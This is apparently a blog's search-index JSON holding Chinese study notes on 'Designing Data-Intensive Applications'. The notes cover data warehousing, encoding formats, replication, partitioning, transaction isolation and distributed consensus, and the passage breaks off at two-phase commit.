使用了多种不同数据模型不同，分析型业务的数据模型要少很多。许多数据仓库使用星型模型，也称为维度建模。 “星型模式”来源自当表关系可视化时，事实表位于中间，被一系列维度表包围；这些表的链接就像星星的光芒。 该模式的一个变体称为雪花模式，其中维度进一步细分为子空间。 ","date":"2020-09-19","objectID":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/:3:6","tags":null,"title":"数据密集型应用系统设计笔记","uri":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"列式存储 在大多数 OLTP 数据库中，存储以面向行的方式布局：来自表的一行的所有值彼此相邻存储。文档数据库也是类似。 面向列的存储的想法很简单：不需要讲一行中的所有值存储在一起，而是将每列中的所受值存储在一起。 列压缩 用位图表示，位图也可以进行游程编码。 列存储的写操作时用 LSM-tree。 物化视图 缓存查询最常用的一些计数或总和。 在 SQL 中，视图（标准视图、虚拟视图）是基于 SQL 语句的结果集的可视化的表。 视图包含行和列，就像一个真实的表。视图中的字段就是来自一个或多个数据库中的真实的表中的字段。我们可以向视图添加 SQL 函数、WHERE 以及 JOIN 语句，我们也可以提交数据，就像这些来自于某个单一的表。 视图总是显示最近的数据。每当用户查询视图时，数据库引擎通过使用 SQL 语句来重建数据。 不同的是，物化视图是查询结果的实际副本，并被写到磁盘，而虚拟视图只是用于编写查询的快捷方式。 在 OLTP 中不长使用物化视图，而对于大量读密集的数据仓库，物化事务则更有意义。 ","date":"2020-09-19","objectID":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/:3:7","tags":null,"title":"数据密集型应用系统设计笔记","uri":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"第四章 数据编码与演化 为了使系统继续顺利运行，需要保持双向的兼容性： 向后兼容 较新的代码可以读取由旧代码编写的数据 向前兼容 较旧的代码可以读取由较新代码编写的数据 使用语言内置的编码方案通常不是个好主意。 ","date":"2020-09-19","objectID":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/:4:0","tags":null,"title":"数据密集型应用系统设计笔记","uri":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"JSON 对处理大数字有问题，可以用数字加字符串一起来表示 对 Unicode 支持很好，但不支持二进制字符串，所以通常用 Base64 将二进制数据编码为文本来解决。数据大小增加了 33% 由可选的模式支持。 ","date":"2020-09-19","objectID":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/:4:1","tags":null,"title":"数据密集型应用系统设计笔记","uri":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"二进制编码 Thrift 和 Protocol Buffers Thrift 和 Protocol Buffers 是两种二进制编码库，相比于直接用 JSON 更省空间 每个字段由其标签号标识，并使用数据类型进行标识。 Avro Apache Avro 是另一种二进制编码格式，也使用模式来指定编码的数据结构，它有两种模式语言：Avro IDL 用于人工编辑，另一种基于 JSON 更易于机器读取。 Avro 模式中没有标签编号，编码是最紧凑的。编码数据中没有任何内容告诉你它是什么类型。解析二进制数据时，按照他们出现在模式中的顺序便利这些字段，然后直接采用模式告诉你的每个字段的数据类型。这意味着读取数据的代码使用与写入数据的代码完全相同的模式才可以正确解析数据。 编码时，它使用所知道的模式的任何版本 来编码数据，这被称为写模式。 解码时，它期望数据符合某个模式，即读模式。 Avro 的关键思想是写模式和读模式不必是完全一样的，它们只需要保持兼容。 为了保持兼容性，只能添加或删除具有默认值的字段。更改字段名称是向后兼容的，但不能向前兼容。 Avro 对动态生成的模式更友好 ","date":"2020-09-19","objectID":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/:4:2","tags":null,"title":"数据密集型应用系统设计笔记","uri":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"数据流的几种模型 数据库 写入数据库的进程对数据进行编码，读数据库的进程进行解码 RPC 和 REST API 客户端对请求进行编码，服务器对请求进行解码并对响应进行编码，客户端最终对响应解码 异步消息传递（使用消息代理或 Actor） 节点之间通过互相发送消息进行通信，信息由发送者编码并由接受者解码 ","date":"2020-09-19","objectID":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/:4:3","tags":null,"title":"数据密集型应用系统设计笔记","uri":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"第五章 数据复制 ","date":"2020-09-19","objectID":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/:5:0","tags":null,"title":"数据密集型应用系统设计笔记","uri":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"主从复制 只有主节点能写，读可以在主或从节点。主节点先写，然后将日志或更改发送给从节点，完成复制。 复制分为同步复制和异步复制 配置新的从节点 在某个时间点对主节点的数据副本产生一个一致性快照 将此快照拷贝到新的从节点 从节点连接到主节点并请求快照之后所发生的数据更改日志 从节点应用这些日志，这个过程称为追赶 复制日志的实现 基于语句的复制 sql 语句，存在不确定因素，如时间 基于预写日志（WAL）传输 所有对数据库的写入的字节序列都被记入日志，因此可以使用完全相同的日志在另一个节点上构建副本。主要缺点是日志描述的数据结果非常底层。对版本要求严格。 基于行的逻辑日志 复制和存储引擎采用不同的日志格式，这样复制与存储逻辑剥离。这种复制日志称为逻辑日志。 这样可以保持向后兼容 基于触发器的复制 更灵活，可以注册自己的应用层代码。 ","date":"2020-09-19","objectID":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/:5:1","tags":null,"title":"数据密集型应用系统设计笔记","uri":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"多主节点复制 系统存在多个主节点，每个都可以接受写请求，客户端将写请求发送到其中一个主节点上，由该主节点负责将数据更改事件同步到其他主节点和自己的从节点。 另一个多主复制比较合适的场景就是离线客户端操作。 还有一个场景是协作编辑。 ","date":"2020-09-19","objectID":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/:5:2","tags":null,"title":"数据密集型应用系统设计笔记","uri":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"处理写冲突 避免冲突 应用层避免冲突。比如特定的用户请求总是路由到特定的数据中心。 收敛于一致状态 给每个写入分配一个唯一 id,挑选最高的 id 获胜，其余丢弃。如果基于时间戳，称为最后写入者获胜。 为每个副本分配一个 id,并制定规则，如序号最高的优先序号低的。 以某种方式将这些值合在一起。 利用预定义好的格式来记录和保留冲突的所有信息，然后依靠应用层来提醒用户。 自定义冲突解决逻辑： 在写入时执行 在读取时执行 ","date":"2020-09-19","objectID":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/:5:3","tags":null,"title":"数据密集型应用系统设计笔记","uri":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"无主节点复制 客户端将写请求发送到多个节点上，读取时从多个节点上并行读取，以此检测和纠正某些过期数据 ","date":"2020-09-19","objectID":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/:5:4","tags":null,"title":"数据密集型应用系统设计笔记","uri":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"一致性模型 写后读一致性 保证用户总能看到自己提交的最新数据 单调读 用户在某个时间点读到数据后，保证此后不会出现比该时间更早的数据 前缀一致读 保证数据之间的因果关系，例如，总是以正确的顺序读取问题，然后看到回答 ","date":"2020-09-19","objectID":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/:5:5","tags":null,"title":"数据密集型应用系统设计笔记","uri":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"检测并发写 最后写入者获胜 确定前后关系 合并同时写入的值 版本矢量 为每个副本和每个主键均定义一个版本号。每个副本在处理写入时增加自己的版本号，并且跟踪从其他副本看到的版本号。通过这些信息来指示要覆盖哪些值、该保留哪些值。所有副本的版本号集合称为版本矢量。 ","date":"2020-09-19","objectID":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/:5:6","tags":null,"title":"数据密集型应用系统设计笔记","uri":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"第六章 数据分区 两种主要的分区方法： 基于关键字区间的分区。先对关键字进行排序，每个分区只负责一段包含最小到最大关键字范围的一段关键字。对关键字排序的优点是可以支持高效的区间查询，但是如果应用程序经常访问与排序一致的某段关键字，就会存在热点的风险。采用这种方法，当分区太大时，通常将其分裂为两个子区间，从而动态的再平衡分区 哈希分区。将哈希函数作用于每个关键字，每个分区负责一定范围的哈希值。这种方法打破了原关键字的顺序关系，它的区间查询效率比较低，但可以更均匀的分配负载。采用哈希分区时，通常事先创建好足够多（但固定数量）的分区，让每个节点承担多个分区，当添加或删除节点时将某些分区从一个节点迁移到另一个节点，也可以支持动态分区。 二级索引也需要分区，有两种方法： 基于文档来分区二级索引（本地索引） 基于词条来分区二级索引（全局索引） ","date":"2020-09-19","objectID":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/:6:0","tags":null,"title":"数据密集型应用系统设计笔记","uri":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"请求路由 允许客户端连接任意的节点。如果节点恰好有所请求的分区，则直接处理，否则转发到下一个合适的节点，接受答复，并将答复返回给客户端。 将所有客户端的请求都发送到一个路由层，由后者将请求转发到对应的分区节点上。路由层充当一个分区感知的伏在均衡器。 客户端感知分区和节点的分配关系。 ","date":"2020-09-19","objectID":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/:6:1","tags":null,"title":"数据密集型应用系统设计笔记","uri":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"第七章 事务 ","date":"2020-09-19","objectID":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/:7:0","tags":null,"title":"数据密集型应用系统设计笔记","uri":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"ACID 原子性：把多个写操作纳入一个原子事务，出现故障时，事物会终止，数据库丢弃或撤销局部完成的更改 一致性：对数据有特定的预期状态，任何数据更改必须满足这些状态约束。一致性更多是应用层的属性。 隔离行：并发执行的多个事物相互隔离，不能互相交叉，可串行化。 持久性：保证事物一旦提交成功，即使存在硬件故障或数据库崩溃，事物所写入的任何数据也不会消失。 ","date":"2020-09-19","objectID":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/:7:1","tags":null,"title":"数据密集型应用系统设计笔记","uri":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"脏读、幻读、不可重复读的概念 脏读 所谓脏读是指一个事务中访问到了另外一个事务未提交的数据 幻读 一个事务读取 2 次，得到的记录条数不一致。 在一个事务中的写入改变了另一个事务查询结果的现象，称为幻读。 不可重复读 一个事务读取同一条记录 2 次，得到的结果不一致 ","date":"2020-09-19","objectID":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/:7:2","tags":null,"title":"数据密集型应用系统设计笔记","uri":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"弱隔离级别 读-提交 是最基本的事务隔离级别，只提供以下两个保证： 读数据库时，只能看到已成功提交的数据（防止脏读） 写数据库时，只能覆盖已成功提交的数据（防止脏写） 读-提交实现 防止脏写：用行级锁。 防止脏读：对于每个待更新的对象，数据库都会维护其旧值和当前持锁事务将要设置的新值两个版本。在事务提交前，所有其他读操作都读取旧值仅当写事务提交后，才会切换到读取新值。 快照级别隔离与可重复读 解决不可重复读。其总体想法是：每个事务都从数据库的一致性快照中读取，事务一开始看到的是最近提交的数据，即使数据随后可能被另一个事务更改，但保证每个事务都只能看到该特定时间点的旧数据。 实现快照级别隔离 通常采用写锁来防止脏写。但是读取不需要加锁。读操作不会阻止写操作，反之亦然。 考虑到多个正在进行的事务可能会在不同的时间点查看数据库状态，所以数据库保留了对象多个不同的提交版本，这种技术因此也被称为多版本并发控制（MVCC） 如果只是为了提供读-提交级别隔离，则只保留对象的两个版本就足够了。支持快照隔离级别的存储引擎往往直接采用 MVCC 来实现读-提交隔离。典型做法是，在读-提交级别下，对每一个不同的查询单独创建一个快照；而快照级别隔离则是使用一个快照来运行整个事务。 一致性快照的可见性规则 仅当以下两个条件都成立，则该数据对象对事务可见： 事务开始的时刻，创建该对象的事务已经完成了提交。 对象没有被标记删除；或者被标记的删除，但删除事务在当前事务开始时还没有完成提交。 ","date":"2020-09-19","objectID":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/:7:3","tags":null,"title":"数据密集型应用系统设计笔记","uri":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"防止更新丢失 原子写操作 例如，以下指令在多数关系型数据库中都是并发安全的： UPDATE counters SET valie = value + 1 WHERE key = 'foo'; 原子操作通常采用对读取对象加独占锁的方式来实现，这样在更新被提交之前不会让对其他事务可以读它。 显示加锁 SELECT * FROM figures WHERE name = 'robort' FOR UPDATE; FOR UPDATE指令指示数据对返回的所有结果行要加锁 自动检测更新丢失 原子操作和锁都是通过强制“读-修改-写回”操作序列串执行来防止丢失更新。另一种思路是先让他们并发执行，但如果事务管理器检测到了更新丢失风险，则终止当前事务，并强制回退到安全的“读-修改-写回”方式。 ","date":"2020-09-19","objectID":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/:7:4","tags":null,"title":"数据密集型应用系统设计笔记","uri":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"写倾斜和幻读 定义写倾斜 如果两个事务读取相同的一组对象，然后更新其中的一部分：不同的事务更新不同的对象，则可能发生写倾斜；而不同的事务如果更新的是同一个对象，则可能发生脏写或更新丢失。 ","date":"2020-09-19","objectID":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/:7:5","tags":null,"title":"数据密集型应用系统设计笔记","uri":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"串行化 两阶段加锁（2PL） 近三十年来，可以说数据库只有一种被广泛使用的串行化算法，那就是两阶段加锁。 多个事务可以同时读取同一个对象，但只要出现任何的写操作，则必须加以独占访问： 如果事务 A 已经读取了某个对象，此时事务 B 想要写入该对象，那么 B 必须等到 A 提交或终止才能继续。以确保 B 不会在事务 A 执行的过程中间去修改对象。 如果事务 A 已经修改了对象，此时事务 B 想要读取该对象，则 B 必须等到 A 提或终止之后才能继续，对于 2PL，不会出现读取到旧值得情况。 快照级别隔离的口号“读写互不干扰”非常准确的点名到了它和 2PL 的关键区别。 2PL 实现 读取用共享锁，可以多个同时共享。写入要独占锁，此时不能有其他的独占锁和共享锁。就像 Rust 的可变引用和不可变引用的规则， ","date":"2020-09-19","objectID":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/:7:6","tags":null,"title":"数据密集型应用系统设计笔记","uri":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"可串行化的快照隔离级别 它提供了完整的可串行化保证，而性能相比于快照隔离损失很小。 2PL 是一种悲观控制机制，可串行化的快照隔离级别是一种乐观并发控制。运行多个事务并发执行互不阻塞；仅当事务尝试提交时，才检查可能的冲突，如果发现违背了串行化，则某些事务会被中止。 ","date":"2020-09-19","objectID":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/:7:7","tags":null,"title":"数据密集型应用系统设计笔记","uri":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"第八章 分布式系统的挑战 ","date":"2020-09-19","objectID":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/:8:0","tags":null,"title":"数据密集型应用系统设计笔记","uri":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"Fencing 令牌 假设每次锁服务在授予锁或租期时，还会同时返回一个 fencing 令牌，该令牌每授予一次就会递增。然后，要求客户端每次向存储系统发送写请求时，都必须包含所持有的 fencing 令牌。这种机制要求资源本身必须主动检查所持令牌信息，如果发现已经处理过更高令牌的请求，要拒绝持有低令牌的所有写请求。 ","date":"2020-09-19","objectID":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/:8:1","tags":null,"title":"数据密集型应用系统设计笔记","uri":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"第九章 一致性共识 分布式一致性模型与我们之前讨论过的多种事务隔离级别有相似之处，但总体讲他们有着显著的区别：事务隔离主要是为了处理并发执行事务时的各种临界条件，而分布式一致性则主要是针对延迟和故障等问题来协调副本之间的状态。 ","date":"2020-09-19","objectID":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/:9:0","tags":null,"title":"数据密集型应用系统设计笔记","uri":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"可线性化 数据库对上提供单个副本的假象，从而不必担心复制滞后。 这就是可线性化（也称原子一致性，强一致性） 可串行化 可串行化是事务的隔离属性，其中每个事务可以读写多个对象。它用来确保事务执行的结果与串行执行（每次执行一个事务）的结果完全相同，即使顺序可能不同。 可线性化 是读写寄存器（单个对象）的最新值保证。它并不要求将操作组合到事务中，因此无法避免写倾斜等问题，除非采取其他额外措施。 数据库可以同时支持可串行化与线性化，称为严格的可串行化或强的单副本可串行化。 基于两阶段加锁或实际以串行执行都是典型的可线性化。但是，可串行化的快照隔离不是线性的。 ","date":"2020-09-19","objectID":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/:9:1","tags":null,"title":"数据密集型应用系统设计笔记","uri":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"线性化使用场景 加锁与主节点选举 约束与唯一性保证 跨通道的时间依赖 实现可线性化系统 主从复制（部分支持可线性化） 共识算法（支持可线性化） 多主复制（不支持） 无主复制（不支持） 不要求线性化的应用更能容忍网络故障，这种思路通常被称为 CAP 定理。 CAP 有时也代表一致性，可用性，分区容错性，系统只能支持其中两个特性。网络分区是一种故障，不管喜不喜欢都存在。 如果系统服从因果所规定的顺序，我们称之为因果一致性。 可线性化强于因果一致性，因果顺序并非全序，因为两个时间可能没因果，并发。 可线性化 在一个可线性化系统中，存在全序操作关系。系统的行为就好像只有一个数据副本，且每个操作都是原子的。 因果关系 如果两个操作都没有发生在对方之前，那么两个操作是并发关系。并发的事件无法排序比较。这表明因果关系至少可以定义为偏序，而非全序。 我们可以使用序列号或时间戳来排序事件。 Lamport 时间戳主要用于确保全序关系。版本向量用以区分两个操作是并发还是因果依赖。Lamport 无法区分两个操作是并发关系还是因果依赖关系。 要知道什么时候全序关系已经确定就需要“全序关系广播” ","date":"2020-09-19","objectID":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/:9:2","tags":null,"title":"数据密集型应用系统设计笔记","uri":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"全序关系广播 它要满足两个基本的安全属性： 可靠发送 没有消息丢失，如果消息发送到了某一个节点，则它一定要发送到所有节点 严格有序 消息总是以相同的顺序发送给每个节点 即使节点或网络出现了故障，全序关系广播算法的正确实现也必须保证上面两条。 全序关系广播是基于异步模型：保证消息以固定的顺序可靠的发送，但是不保证消息何时发送成功。而可线性化强调就近性：读取时保证能看到最新的写入值。 ","date":"2020-09-19","objectID":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/:9:3","tags":null,"title":"数据密集型应用系统设计笔记","uri":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"分布式事务与共识 原子提交与两阶段提交 单点原子提交 在单节点上，事务提交非常依赖于数据持久写入磁盘的顺序关系：先写入数据，然后再提交记录。事务提交（或中止）的关键点在于磁盘完成日志记录的时刻：在完成日志记录写之前如果发生了崩溃，则事务需要中止否则事务被提交。 两阶段提交（2pc） 2pc 